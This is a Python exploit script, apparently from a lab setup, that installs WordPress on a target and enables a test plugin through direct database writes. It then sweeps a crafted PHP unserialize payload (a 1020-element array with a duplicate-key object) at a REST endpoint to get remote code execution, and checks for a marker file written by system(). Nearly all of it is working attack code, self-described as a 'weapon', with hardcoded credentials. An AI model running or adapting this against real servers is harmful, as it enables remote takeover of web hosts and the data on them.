#!/usr/bin/env python3
"""
fa_wp_fire.py — MISSION 1: full zero4 chain through WordPress HTTP.

1. HTTP install WordPress on the target (5-minute installer).
2. Activate the fa-import lab plugin (plugin-level unserialize surface —
   the receipted shape34 class) via direct DB option write.
3. Verify the REST surface with a benign payload.
4. POST the FULL weapon trigger (the 12KB a:1020 with the Stage1 dup-key
   object — the exact pwn_zero4_live.php payload) with a groom sweep.
5. Receipt = HTTP response body containing the stage log + marker, and/or
   follow-up GET of the marker file the fired system() wrote.

Usage: python3 fa_wp_fire.py http://127.0.0.1:8085 [gmax] [attempts]
"""
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8085").rstrip("/")
GMAX = int(sys.argv[2]) if len(sys.argv) > 2 else 12
ATT = int(sys.argv[3]) if len(sys.argv) > 3 else 3
USER = "faadmin"
PWD = "Fa_pass-12345!"

def req(path, data=None, timeout=60, headers=None):
    url = path if path.startswith("http") else BASE + path
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"User-Agent": "fa-weapon"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "%s: %s" % (type(e).__name__, e)

def db(sql):
    out = subprocess.run(
        ["docker", "exec", "wpdb", "mariadb", "-uwp", "-pwppw", "wordpress", "-N", "-e", sql],
        capture_output=True, text=True, timeout=30)
    return out.stdout.strip(), out.stderr.strip()

def build_trigger():
    els = ["i:%d;i:1;" % k for k in range(1018)]
    els.append('i:9998;O:6:"Stage1":0:{}')
    els.append("i:9998;i:5;")
    return "a:1020:{" + "".join(els) + "}"

def main():
    print("=" * 72)
    print("fa MISSION 1 — full zero4 chain through WordPress HTTP")
    print("target %s  (Apache mod_php, PHP 8.5.11)" % BASE)
    print("=" * 72)

    # ---- 1. install
    st, body = req("/wp-admin/install.php")
    if "Already Installed" in body:
        print("[install] already installed")
    else:
        st, body = req("/wp-admin/install.php?step=2", data={
            "weblog_title": "FA Lab", "user_name": USER,
            "admin_password": PWD, "admin_password2": PWD, "pw_weak": "1",
            "admin_email": "admin@fa.local", "blog_public": "1", "language": "",
            "Submit": "Install WordPress"})
        ok = "Success" in body
        print("[install] status=%s success=%s" % (st, ok))
        if not ok:
            print(body[:1500]); sys.exit(1)

    # ---- 2. activate plugin via DB
    o, e = db("SELECT option_value FROM fa_options WHERE option_name='active_plugins'")
    val = 'a:1:{i:0;s:23:"fa-import/fa_wp_rce.php";}'
    o2, e2 = db("INSERT INTO fa_options (option_id, option_name, option_value, autoload) "
                "VALUES (NULL, 'active_plugins', '%s', 'yes') "
                "ON DUPLICATE KEY UPDATE option_value='%s'" % (val, val))
    o3, e3 = db("SELECT option_value FROM fa_options WHERE option_name='active_plugins'")
    print("[plugin] active_plugins=%s" % o3)

    # ---- 3. surface check
    st, body = req("/?rest_route=/fa/v1/import", data={"data": 'a:1:{i:0;s:6:"benign";}'})
    print("[surface] %s %s" % (st, body.strip()[:160]))
    if "no data" in body or st != 200:
        sys.exit(1)

    trig = build_trigger()
    print("[weapon] trigger bytes=%d (a:1020 with Stage1 dup-key object)" % len(trig))

    # ---- 4. sweep
    hit = False
    for g in range(0, GMAX + 1):
        st, body = req("/?rest_route=/fa/v1/import", data={"data": trig, "g": g, "a": ATT, "f": "8511"})
        print("[shot g=%d] status=%s len=%d RCE=%s" % (
            g, st, len(body), "YES" if "RCE=YES" in body else "no"))
        tail = body.strip().splitlines()[-6:]
        for line in tail:
            print("        %s" % line)
        if "RCE=YES" in body or "uid=" in body:
            hit = True
            break
        st2, body2 = req("/fa_rce_receipt.txt")
        if st2 == 200 and "uid=" in body2:
            print("[marker-followup] %s" % body2.strip())
            hit = True
            break

    # ---- 5. receipts
    st, body = req("/?rest_route=/fa/v1/receipt")
    print("[receipt-route] %s %s" % (st, body[:400]))
    st, body = req("/fa_rce_receipt.txt")
    print("[marker-file] %s %s" % (st, body.strip()[:200]))
    print("[RESULT] %s" % ("HIT — remote RCE through WordPress HTTP" if hit or "uid=" in body else "no hit in sweep"))

if __name__ == "__main__":
    main()
